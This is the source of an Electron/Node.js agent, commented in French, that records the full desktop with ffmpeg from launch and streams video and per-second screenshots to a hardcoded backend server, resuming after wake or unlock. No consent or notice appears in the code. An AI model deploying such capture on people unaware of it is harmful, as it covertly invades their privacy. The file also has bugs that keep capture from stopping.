const express = require("express");
const { spawn, exec } = require("child_process");
const http = require("http");
const socketIo = require("socket.io-client");
const os = require("os");
const { app, screen, powerMonitor } = require("electron");

const appli = express();
const server = http.createServer(appli);
let ffmpeg; // Stocke le processus FFmpeg pour le redémarrer si besoin
let io;
const PORT = 9000;
const serveurBackend = "http://192.168.1.177:4000";

let idClient = "67e50bdcd4d9dd49536d6766";

const helper = require("./helper/helper");
let fileName = helper.generateFileName(idClient);
let dateFolder = helper.generateDate();
let isConnected = true;
let resolution = "1280x720"; // Valeur par défaut

function startCapture() {
  const platform = os.platform();

  if (platform == "win32") {
    const capture = "gdigrab"; // Utilisation de gdigrab pour Windows
    const fps = "25"; // Nombre d'images par seconde
    const captureOs = "desktop"; // Capture de l'écran complet
    const qualite = "31"; // Qualité de compression (plus bas = meilleure qualité)
    const format = "mp4"; // Format de sortie MJPEG

    // Commande FFmpeg pour capturer l'écran et encoder en H.264
    var ffmpeg = spawn("ffmpeg", [
      "-f", capture,
      "-r", fps.toString(),
      "-s", resolution,
      "-i", captureOs,
      "-q:v", qualite.toString(),
      "-c:v", "libx264",
      "-preset", "veryfast",
      "-crf", "23",
      "-pix_fmt", "yuv420p",
      "-movflags", "frag_keyframe+empty_moov",
      "-f", format,
      "pipe:1",
    ]);
    var ffmpegImg = spawn("ffmpeg", [
      "-f", "gdigrab",                 // Capture d'écran sous Windows
      "-framerate", "1",               // Fréquence d'image (1 image par seconde)
      "-video_size", resolution,       // Taille de la capture
      "-i", "desktop",                 // Capture du bureau entier
      "-vf", "fps=1/1",                // Une image par seconde
      "-vcodec", "libwebp",            // Codec pour les images WebP
      "-lossless", "0",                // Compression avec perte
      "-q:v", "10",                    // Qualité (0-100, 100 est la meilleure)
      "-f", "image2pipe",              // Sortie via pipe
      "pipe:1"
    ]);
  }
  if (platform == "linux") {
    const capture = "x11grab";
    const fps = "25";
    const captureOs = ":0.0";
    const qualite = "31";
    const format = "mp4";
    var ffmpeg = spawn("ffmpeg", [
      "-f",capture, // Capture écran (Linux)
      "-r",fps, // Taux d'images par seconde
      "-s",resolution, // Résolution
      "-i",captureOs, // Capture de l'écran (Linux)
      "-q:v",qualite, // Qualité vidéo (valeur de 1 à 31, 5 est généralement bon)
      "-c:v","libx264",
      "-preset","veryfast",
      "-crf","23",
      "-pix_fmt","yuv420p",
      "-movflags","frag_keyframe+empty_moov",
      "-f",format, // Format de sortie MJPEG
      "pipe:1", // Sortie via un flux
    ]);
   
    var ffmpegImg = spawn("ffmpeg", [
      "-f", "x11grab",
      "-video_size", resolution,
      "-i", ":0.0",
      "-vf", "fps=1/1",  // Une image par seconde
      "-vcodec", "libwebp",
      "-lossless", "0",  // Compression avec perte pour réduire la taille
      "-q:v", "10",      // Qualité (0-100, 100 est la meilleure)
      "-f", "image2pipe",
      "pipe:1"
    ]);
  }
  ffmpegImg.stdout.on("data", (data) => {
    io.emit("test", { data, client: idClient });   // Envoyer les données via WebSocket
  });
  ffmpeg.stdout.on("data", (data) => {
    if (io) io.emit("video", { data, client: idClient, fileName: fileName });
  });
}

// Fonction pour arrêter FFmpeg
function stopCapture() {
  if (ffmpeg) {
    ffmpeg.kill("SIGTERM");
    ffmpeg = null;
  }
}

// Fonction pour redémarrer FFmpeg
function restartCapture() {
  fileName = helper.generateFileName(idClient);
  io.emit("sendVideo", {
    client: idClient,
    fileName: fileName,
    dateFolder: dateFolder,
  });
  startCapture();
}


// Gestion de la mise en veille et du réveil
app.whenReady().then(() => {
  const displays = screen.getAllDisplays();
  let totalWidth = 0,
    totalHeight = 0;

  displays.forEach((display) => {
    totalWidth += display.bounds.width;
    totalHeight = Math.max(totalHeight, display.bounds.height);
  });

  resolution = `${totalWidth}x${totalHeight}`;

  io = socketIo(serveurBackend);
  io.on("connect", () => {
    io.emit("sendVideo", {
      client: idClient,
      fileName: fileName,
      dateFolder: dateFolder,
    });
  });

  startCapture(); // Démarrer la capture dès le lancement

  server.listen(PORT, () => {
    console.log("serveur running on port " + PORT);
  });
});

// Vérifier si l'ordinateur est toujours en ligne
function checkConnection() {
  exec("ping -c 1 google.com", (error) => {
    if (error) {
      if (isConnected) {
        isConnected = false;
      }
    } else {
      if (!isConnected) {
        isConnected = true;
        startCapture();
      }
    }
  });
}

powerMonitor.on("suspend", () => {
  stopCapture();
});

powerMonitor.on("resume", () => {
  restartCapture();
});

powerMonitor.on("lock-screen", () => {
  stopCapture();
});

powerMonitor.on("unlock-screen", () => {
  restartCapture();
});

setInterval(checkConnection, 5000);
